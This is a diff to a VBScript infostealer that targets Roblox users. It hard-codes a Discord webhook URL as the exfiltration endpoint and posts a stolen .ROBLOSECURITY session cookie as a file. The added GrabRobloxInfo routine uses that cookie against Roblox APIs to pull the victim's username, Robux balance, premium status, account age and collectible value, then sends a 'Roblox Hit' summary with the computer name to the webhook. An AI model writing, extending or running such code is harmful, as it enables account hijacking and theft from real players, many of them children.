@@ -7,7 +7,7 @@ On Error Resume Next
 Dim sh, fso, WH, PC, USER
 Set sh  = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
-WH   = "https://discord.com/api/webhooks/1555782526923177994/bNFuu-nXUEK5faw8p_307o954rFAqOMllkMY1XTyeYOKvPzXDiIdxlZTzYenQ19IyM9Z"  ' <-- swap
+WH   = "https://discord.com/api/webhooks/1555782526923177994/bNFuu-nXUEK5faw8p_307o954rFAqOMllkMY1XTyeYOKvPzXDiIdxlZTzYenQ19IyM9Z"
 PC   = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
 
@@ -303,8 +303,112 @@ Sub GrabRoblox()
     If Not fso.FileExists(tf) Then Exit Sub
     raw = Trim(ReadFile(tf))
     If fso.FileExists(tf) Then fso.DeleteFile tf, True
-    If raw <> "NOT_FOUND" And Len(raw) > 10 Then PostFile "roblox_cookie.txt", raw
+    If raw <> "NOT_FOUND" And Len(raw) > 10 Then
+        PostFile "roblox_cookie.txt", raw
+        GrabRobloxInfo raw
+    End If
 End Sub
+
+Sub GrabRobloxInfo(cookie)
+    Dim xh, json, uinfo, uid, uname, robux, premium, created, ageDays, rapVal, createdDate
+
+    Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    xh.SetOption 2, 13056
+
+    ' --- userinfo (uid, username, robux, premium) ---
+    xh.Open "GET", "https://www.roblox.com/mobileapi/userinfo", False
+    xh.SetRequestHeader "Cookie", ".ROBLOSECURITY=" & cookie
+    xh.Send
+    If xh.Status <> 200 Then Set xh = Nothing : Exit Sub
+    json = xh.responseText
+
+    uid     = RegexFirst(json, """UserID"":(\d+)")
+    uname   = RegexFirst(json, """UserName"":""([^""]+)""")
+    robux   = RegexFirst(json, """RobuxBalance"":(\d+)")
+    premium = RegexFirst(json, """IsPremium"":(true|false)")
+    If uid = "" Then Set xh = Nothing : Exit Sub
+    If robux   = "" Then robux   = "0"
+    If premium = "" Then premium = "false"
+
+    ' --- account created date / age ---
+    xh.Open "GET", "https://users.roblox.com/v1/users/" & uid, False
+    xh.Send
+    ageDays = "?"
+    If xh.Status = 200 Then
+        uinfo   = xh.responseText
+        created = RegexFirst(uinfo, """created"":""([^T]+)")
+        If created <> "" Then
+            On Error Resume Next
+            createdDate = CDate(created)
+            If Err.Number = 0 Then ageDays = CStr(DateDiff("d", createdDate, Now()))
+            On Error GoTo 0
+        End If
+    End If
+
+    ' --- RAP: sum recentAveragePrice from collectibles ---
+    rapVal = "0"
+    xh.Open "GET", "https://inventory.roblox.com/v1/users/" & uid & "/assets/collectibles?limit=100", False
+    xh.SetRequestHeader "Cookie", ".ROBLOSECURITY=" & cookie
+    xh.Send
+    If xh.Status = 200 Then
+        Dim rapJson : rapJson = xh.responseText
+        Dim rapSum  : rapSum  = 0
+        Dim pos     : pos     = 1
+        Dim key     : key     = """recentAveragePrice"":"
+        Dim p, numStr, ch
+        Do
+            p = InStr(pos, rapJson, key)
+            If p = 0 Then Exit Do
+            p = p + Len(key)
+            numStr = ""
+            Do While p <= Len(rapJson)
+                ch = Mid(rapJson, p, 1)
+                If ch >= "0" And ch <= "9" Then
+                    numStr = numStr & ch
+                    p = p + 1
+                Else
+                    Exit Do
+                End If
+            Loop
+            If numStr <> "" Then rapSum = rapSum + CLng(numStr)
+            pos = p
+        Loop
+        rapVal = CStr(rapSum)
+    End If
+
+    Set xh = Nothing
+
+    ' --- build embed matching checker layout ---
+    Dim nl : nl = Chr(10)
+    Dim embedDesc : embedDesc = ""
+
+    embedDesc = embedDesc & "**Username** | **Age** | **PC**" & nl
+    embedDesc = embedDesc & uname & " | " & ageDays & " Days | " & PC & nl & nl
+    embedDesc = embedDesc & "**Robux** | **Premium** | **RAP**" & nl
+    embedDesc = embedDesc & robux & " | " & premium & " | " & rapVal & nl & nl
+    embedDesc = embedDesc & "**Cookie**" & nl
+    embedDesc = embedDesc & "``Check attached file``"
+
+    PostEmbed "Roblox Hit", embedDesc, 16711680
+End Sub
+
+' --- regex helpers (VBScript native, no external deps) ---
+Function RegexFirst(src, pattern)
+    Dim rx : Set rx = CreateObject("VBScript.RegExp")
+    rx.Pattern = pattern
+    rx.IgnoreCase = True
+    Dim m : Set m = rx.Execute(src)
+    If m.Count > 0 Then
+        If m(0).SubMatches.Count > 0 Then
+            RegexFirst = m(0).SubMatches(0)
+        Else
+            RegexFirst = m(0).Value
+        End If
+    Else
+        RegexFirst = ""
+    End If
+    Set rx = Nothing
+End Function
 
 Function TmpFile(n) : TmpFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\" & n : End Function
 
@@ -312,7 +416,6 @@ Function ReadFile(p)
     Dim f : Set f = fso.OpenTextFile(p, 1) : ReadFile = f.ReadAll : f.Close : Set f = Nothing
 End Function
 
-' --- Direct Discord webhook, no relay, no x-auth header ---
 Sub PostEmbed(t, d, c)
     Dim DQ, j, h
     DQ = Chr(34)
